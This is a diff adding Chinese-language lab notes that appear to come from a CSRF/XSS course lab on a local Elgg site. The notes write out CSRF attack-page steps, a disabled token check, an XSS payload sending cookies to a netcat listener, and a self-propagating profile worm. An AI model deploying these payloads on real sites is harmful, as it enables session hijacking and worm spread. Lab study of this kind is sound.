@@ -1,0 +1,117 @@
+
+sudo service apache2 start
+打开firefox ，tools-web Developer -Get more Tools .安装Http header live
+www.csflabelgg.com
+www.xsslabelgg.com
+
+
+
+实验一：
+
+①首先add samy 查看相应的HTTP报文 得到samy的序号是45
+②进入/var/www/CSRF/Attacker 目录下添加lm.html文件（编写攻击网页内容）
+sudo vim lm.html
+③去 www.csrflabattacker.com网站查看增加的文件。
+④用charile登录并编写邮件给Alice 
+
+just click http://www.csrflabattacker.com/lm.html
+
+⑤登录alice查看邮件并点击（点前clear掉），发现已经添加了Samy为好友并抓到GET报文请求。
+ 
+
+实验二：
+①使用alice身份登录并修改自己的个人资料抓到相应的信息
+②进入/var/www/CSRF/Attacker 目录下添加post.html文件（编写攻击网页内容）
+sudo vim post.html
+③去 www.csrflabattacker.com网站查看增加的文件。
+④用charile登录并编写邮件给Alice 
+just click http://www.csrflabattacker.com/post.html
+⑤登录alice查看邮件并点击（点前clear掉），发现个人主页信息被修改并抓到相应请求。
+
+实验三：
+①使用Alice身份登录 ，抓到相应的包
+②进入/var/www/CSRF/Attacker 目录下添加login.html文件（编写攻击网页内容）
+sudo vim login.html
+③去 www.csrflabattacker.com网站查看增加的文件。
+④用charile登录并编写邮件给Alice 
+just click http://www.csrflabattacker.com/login.html
+
+实验四：
+①进入/var/www/CSRF/Elgg/vendor/elgg/engine/classes/Elgg
+sudo gedit ActionsService.php
+注释掉return true
+依次测试实验一二三
+
+实验五：
+①登录www.xsslabelgg.com
+②登录 samy账户，打开个人简历，在brief description中添加脚本
+<script> 
+document.write('<img src=http://localhost:5555?c=' + escape(document.cookie) 
++ ' >'); 
+</script> 
+③登录alice账户(clear一下)，开启监听
+sudo nc -l 5555 -v
+点击samy主页，截获到cookie
+④比对cookies
+
+实验六：
+①登录www.xsslabelgg.com
+②登录 samy账户，打开个人简历，在About me中添加脚本（html）
+<script type="text/javascript">
+    window.onload = function () {
+        //自动获取ts、token等信息     
+        var elgg_ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+        var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+        var guid = "&guid=" + elgg.session.user.guid;
+        var name = "&name=" + elgg.session.user.name;
+        var desc = "&description=Samy is my hero." + "&accesslevel[description]=2";
+        var content = elgg_token + elgg_ts + name + desc + guid;
+        var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+        var SamyGUID = "&guid=" + 47;
+        if (guid != SamyGUID) {
+            var Ajax = null;
+            Ajax = new XMLHttpRequest();
+            Ajax.open("POST", sendurl, true);
+            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            Ajax.send(content);
+        }
+    }
+</script>
+
+③登录alice账户，点击samy账户，发现alice修改掉了个人介绍签名 并截获到POST。
+
+
+④此时修改alice的个人信息（为了下面的实验）
+
+实验七：
+①登录 samy账户，打开个人简历，在About me中添加脚本（html）
+<script id="worm" type="text/javascript">
+    window.onload = function () {
+        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        var jscodeTag = document.getElementById("worm").innerHTML;
+        var footerTag = "</" + "script>"
+        var wormcode = encodeURIComponent(headerTag + jscodeTag + footerTag);
+        var elgg_ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+        var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+        var guid = "&guid=" + elgg.session.user.guid;
+        var name = "&name=" + elgg.session.user.name;
+        var desc = "&description=Samy is my hero. (worm)" + wormcode +"&accesslevel[description]=2";
+        var content = elgg_token + elgg_ts + name + desc + guid;
+        var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+        var SamyGUID = "&guid=" + 47;
+        if (guid != SamyGUID) {
+            var Ajax = null;
+            Ajax = new XMLHttpRequest();
+            Ajax.open("POST", sendurl, true);
+            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+          Ajax.send(content);
+        }
+    }
+</script>
+②Alice访问Samy主页，发现自己被改
+③charlie访问Alice主页，发现自己被改
+
+
+实验八：
+
+
